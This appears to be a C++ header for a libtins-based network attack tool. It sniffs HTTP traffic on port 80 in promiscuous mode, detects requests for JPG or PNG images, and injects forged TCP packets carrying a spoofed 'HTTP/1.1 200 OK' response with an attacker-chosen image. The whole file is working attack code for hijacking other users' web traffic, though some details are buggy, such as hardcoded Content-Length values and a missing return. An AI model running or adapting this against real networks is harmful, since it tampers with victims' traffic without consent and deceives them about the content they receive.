#ifndef PK_CHANGE_H
#define PK_CHANGE_H
#include <tins/tins.h>
#include <iostream>
#include <arpa/inet.h>
#include <algorithm>
#include <fstream>
#include <tins/network_interface.h>
#include <thread>
#include <chrono>
using namespace Tins;
using namespace std;
typedef HWAddress<6> address;
char *sf_dev;
char *sd_dev;
char *jpg_path, *png_path;
address mac;
struct pk_set
{


    EthernetII new_ethernet;
    IP new_ip;
    TCP new_tcp;
    PacketSender sender;
    uint8_t *jpg,*png;
    u_int32_t jpg_len,png_len;
    EthernetII psh_attack;
    int web_image(char *_data)
    {
        if((bool)strstr(_data,".jpg"))
            return 1;
        else if((bool)strstr(_data,".png"))
            return 2;
    }
    void image_f(int i)
    {

        switch(i)
        {
        case 1:
        {
            FILE *fp = fopen(jpg_path,"rb");
            fseek(fp,0,SEEK_END);//moving list array
            jpg_len = ftell(fp);
            cout<<"file size : "<<jpg_len<<"\n";
            fseek(fp,0,SEEK_SET);//moving start array
            jpg = (uint8_t *)malloc(jpg_len);
            if(fread(jpg,jpg_len,1,fp))
                cout<<"success data read\n";
            else
                cout<<"reading data failed\n";
            fclose(fp);
            break;
        }
        case 2:
        {
            FILE *fp = fopen(png_path,"rb");
            fseek(fp,0,SEEK_END);//moving list array
            png_len = ftell(fp);
            cout<<"file size : "<<png_len<<"\n";
            fseek(fp,0,SEEK_SET);//moving start array
            png = (uint8_t *)malloc(png_len);
            if(fread(png,png_len,1,fp))
                cout<<"success data read\n";
            else
                cout<<"reading data failed\n";
            fclose(fp);
            break;
        }
        }
    }
    void sf_set()
    {
        SnifferConfiguration config;
        config.set_promisc_mode(true);
        config.set_filter("port 80");
        config.set_immediate_mode(true);
        Sniffer sniffer(sf_dev, config);
        sniffer.sniff_loop(make_sniffer_handler(this, &pk_set::handle));
    }
    void debug(EthernetII ethernet, IP ip, TCP tcp)
    {
        cout<<"ethernet<src /dst> :"<<hex<<ethernet.src_addr()<<" / "<<ethernet.dst_addr()<<"\n";
        cout<<"IP src<src /dst> :"<<dec<<ip.src_addr()<<" / "<<ip.dst_addr()<<"\n";
        cout<<"IP Check sum : "<<ip.checksum()<<"\n";
        cout<<"Tcp port<src /dst> :"<<hex<<tcp.sport()<<" / "<<tcp.dport()<<"\n";
        cout<<"tcp.seq num : "<<hex<<tcp.seq()<<"\n";
        cout<<"tcp.ack num : "<<hex<<tcp.ack_seq()<<"\n";
        cout<<"tcp flag : "<<tcp.flags()<<"\n";
        cout<<"tcp ack : "<<tcp.ACK<<"\n";
        cout<<"tcp psh : "<<tcp.PSH<<"\n";
        cout<<"tcp Check sum :"<<tcp.checksum()<<"\n";
    }
    void pk_swap(EthernetII ethernet, IP ip, TCP tcp)
    {
        new_ethernet.src_addr(mac);
        new_ethernet.dst_addr(ethernet.src_addr());
        new_ip.src_addr(ip.dst_addr());
        new_ip.dst_addr(ip.src_addr());
        new_tcp.sport(tcp.dport());
        new_tcp.dport(tcp.sport());
        new_tcp.flags(0x18);

    }
    void tcp_caculator(TCP tcp,uint32_t payload_len)
    {
        new_tcp.seq(tcp.ack_seq());
        new_tcp.ack_seq(tcp.seq() + payload_len);
    }
    void chg_send(int num)
    {

        if(num == 1)
        {
        psh_attack = new_ethernet / new_ip / new_tcp / RawPDU("HTTP/1.1 200 OK\r\nContent-Type: image/jpeg\r\nContent-Length: 1282\r\n\r\n")/RawPDU((const uint8_t *)jpg,jpg_len);
        sender.send(psh_attack, sd_dev);
        }
        else if(num == 2)
        {
        psh_attack = new_ethernet / new_ip / new_tcp / RawPDU("HTTP/1.1 200 OK\r\nContent-Type: image/png\r\nContent-Length: 1219\r\n\r\n")/RawPDU((const uint8_t *)png,png_len);
        sender.send(psh_attack, sd_dev);
        }
        cout<<"send packet\n";
        debug(new_ethernet,new_ip,new_tcp);
    }
    bool handle(PDU& pdu)
    {
        const EthernetII &ethernet = pdu.rfind_pdu<EthernetII>();
        const IP &ip = pdu.rfind_pdu<IP>();
        const TCP &tcp = pdu.rfind_pdu<TCP>();
        const RawPDU& raw = tcp.rfind_pdu<RawPDU>();
        const RawPDU::payload_type& payload = raw.payload();
        if(tcp.flags() == 0x18 && tcp.dport() == 0x50)
        {

            pk_swap(ethernet,ip,tcp);
            tcp_caculator(tcp,payload.size());
            if(web_image((char *)payload.data()) == 1)
                chg_send(1);//jpeg
            if(web_image((char *)payload.data()) == 2)
                chg_send(2);//png
            cout<<"request packet \n";
            debug(ethernet,ip,tcp);
            cout<<payload.data()<<"\n";

        }
        return true;
    }
};
bool check(int argc, char *argv[])
{
    if(argc == 5)
    {
        sf_dev = argv[1];
        sd_dev = argv[2];
        jpg_path = argv[3];
        png_path = argv[4];
        return true;
    }
    else
    {
        cout<<"<sniffing dev> <send dev> <jpg path> <png path>\n";
        return false;
    }
}
#endif // PK_CHANGE_H
